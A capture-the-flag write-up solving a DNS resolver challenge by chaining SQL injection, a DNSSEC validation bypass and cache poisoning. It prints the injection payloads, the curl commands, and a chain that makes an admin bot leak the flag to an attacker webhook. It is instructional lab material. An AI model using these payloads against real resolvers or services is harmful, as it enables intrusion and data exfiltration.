---
ctf_name: "TJCTF 2026"
challenge_name: "trust-issues"
category: "crypto"
difficulty: "hard"
author: "oscarjhk"
date: "2026-05-15"
tags: ["DNSSEC", "SQLite injection", "cache poisoning", "SSRF"]
---

# trust-issues

## Problem Description

> I made my own DNS resolver and I made sure I could trust it as much as my nameserver by using an even bigger elliptic curve.

The challenge consisted of three services:

- a custom DNS resolver,
- a custom nameserver for `trust-issues.tjc.tf`,
- an admin bot that asks the resolver for the website address and then visits that address with the flag in the query string.

At first glance the challenge looks like a DNSSEC crypto problem. The nameserver uses ECDSA P-521 signatures, and the resolver is supposed to trust only DNSSEC-validated records. In practice, the resolver has both SQL injection bugs and DNSSEC validation logic bugs, so I could poison its cache with an arbitrary record and use the admin bot as a flag exfiltration primitive.

## Solution

### Resolver Cache SQL Injection

The resolver caches records in SQLite. However, it inserts upstream answer fields with f-strings:

```python
def add_record(record):
    conn = db()
    cursor = conn.cursor()
    expires = int(time.time()) + record["TTL"]
    cursor.execute(
        f"INSERT INTO records VALUES "
        f"('{record['name']}', {record['type']}, {record['TTL']}, {expires}, '{record['data']}')"
    )
    conn.commit()
    conn.close()
```

The RRSIG cache insert has the same problem:

```python
cursor.execute(
    f"INSERT INTO rrsigs VALUES "
    f"('{record['name']}', {rrtype}, {int(parts[1])}, ..., '{parts[7]}', '{parts[8]}', {expires})"
)
```

This is exploitable because the resolver lets the client choose the upstream server:

```python
globals()["UPSTREAM"] = request.args.get("upstream", "https://8.8.8.8/resolve")
```

For names other than the challenge domain itself, the resolver sends a DNS-over-HTTPS-style request to the configured upstream. By pointing `upstream` to a server I control, I can return JSON that looks like a DNS answer but contains SQL payloads in the `data` field.

### DNSSEC Verification Bypass

The cache poisoning still needs to pass the resolver's DNSSEC check. The relevant verification logic is:

```python
for sig_row in rrsigs:
    rrsig = parse_rrsig(sig_row)
    signing_key = find_signing_key(rrsig, dnskeys)
    if not signing_key:
        continue

    valid = verify_rrset(rrset, rrsig, signing_key["public_key_b64"])
    if not valid:
        return False
return True
```

If an RRSIG exists but no matching DNSKEY is found, the signature is skipped. If every signature is skipped, the loop ends and the function still returns `True`.

There is another helpful edge case in `validate_dnskeys`:

```python
ksks = [r for r in dnskey_records if (r["data"].split()[0] == "257")]
...
for key_record in ksks:
    for ds in parsed_ds:
        if not verify_ds(key_record["data"], ds):
            raise Exception(...)
return True
```

If the fake DNSKEY RRset contains only flag `256` keys, then `ksks` is empty and DS validation is skipped.

So the bypass is:

1. Insert a fake DNSKEY record for a fake signer zone such as `evil.`.
2. Use flag `256`, not `257`, so DS validation has no KSK to check.
3. Insert a fake RRSIG for the poisoned record.
4. Make the RRSIG key tag or algorithm not match the fake DNSKEY.
5. The resolver sees an RRset, an RRSIG, and DNSKEYs, but performs no real signature verification and returns `True`.

### Poisoned Record Design

I did not directly overwrite the challenge domain record. Instead, I inserted a separate record named `altssrf.` and used SQL injection in the later cache lookup to select it.

The important injected records were equivalent to:

```sql
('altssrf.', 1, 300, <exp>,
 '<resolver>/?name=nohit.leak&type=A&upstream=http://<webhook>?leak=')

('evil.', 48, 300, <exp>,
 '256 3 13 <fake-public-key>')

('evil.', 43, 300, <exp>,
 '1 17 2 00')
```

And the fake RRSIG row was equivalent to:

```sql
('altssrf.', 1, 17, 1, 300, <inception>, <expiration>,
 999, 'evil.', 'AAAA', <exp>)
```

The fake DNSKEY uses algorithm `13`, while the fake RRSIG uses algorithm `17` and key tag `999`. Therefore `find_signing_key` finds no matching key, skips the signature, and accepts the RRset.

The upstream JSON response used for poisoning had this shape:

```json
{
  "Status": 0,
  "Question": [
    {
      "name": "ignored.",
      "type": 1
    }
  ],
  "Answer": [
    {
      "name": "src.evil.",
      "type": 1,
      "TTL": 300,
      "data": "1.2.3.4'),('altssrf.',1,300,<exp>,'<resolver>/?name=nohit.leak&type=A&upstream=http://<webhook>?leak='),('evil.',48,300,<exp>,'256 3 13 <fake-public-key>'),('evil.',43,300,<exp>,'1 17 2 00')--"
    },
    {
      "name": "src.evil.",
      "type": 46,
      "TTL": 300,
      "data": "a 17 1 300 <sig-exp> <inception> 1 evil. x',9999999999),('altssrf.',1,17,1,300,<inception>,<sig-exp>,999,'evil.','AAAA',<exp>)--"
    }
  ]
}
```

To trigger insertion, I made the resolver query a cache-miss name and set the upstream to my controlled endpoint:

```bash
curl 'https://<resolver>/?name=nohit.altssrf&type=A&upstream=http://<webhook>'
```

The response was `404`, which is fine. The useful side effect is that the resolver fetched my JSON and inserted the poisoned rows.

Then I verified the poison with:

```bash
curl 'https://<resolver>/?name=%27%20OR%20name%3D%27altssrf.%27%20--%20&type=A'
```

The resolver returned:

```json
{
  "data": "<resolver>/?name=nohit.leak&type=A&upstream=http://<webhook>?leak=",
  "name": "altssrf.",
  "type": 1
}
```

### Admin Bot Exfiltration

The admin bot appends its own query string to the submitted resolver URL:

```javascript
await fetch(url + '?name=trust-issues.tjc.tf&type=A').then(...)
await page.goto('https://' + data + '?flag=' + flag, ...)
```

I submitted a URL that already had an injected `name` parameter:

```text
https://<resolver>/?name=%27%20OR%20name%3D%27altssrf.%27%20--%20&type=A&z=
```

After the bot appends `?name=trust-issues.tjc.tf&type=A`, Flask still parses the first `name` and `type` values. The resolver's vulnerable SELECT becomes:

```sql
SELECT * FROM records WHERE name = '' OR name='altssrf.' -- .' AND type = 1
```

So the bot receives this "A record":

```text
<resolver>/?name=nohit.leak&type=A&upstream=http://<webhook>?leak=
```

Then the bot visits:

```text
https://<resolver>/?name=nohit.leak&type=A&upstream=http://<webhook>?leak=?flag=<flag>
```

That makes the resolver perform one more upstream request to:

```text
http://<webhook>?leak=?flag=<flag>&name=nohit.leak.&type=1&do=true
```

The flag is now visible in the webhook request URL.

## Flag

```text
tjctf{REDACTED}
```

## Takeaways

The P-521 nameserver implementation was a convincing distraction, but the resolver's trust boundary failed much earlier. Unescaped SQL allowed arbitrary cache rows to be inserted, and the DNSSEC validation code treated "no matching signing key" as success instead of failure. Once a forged RRset could pass validation, the admin bot became a straightforward SSRF-style exfiltration path.
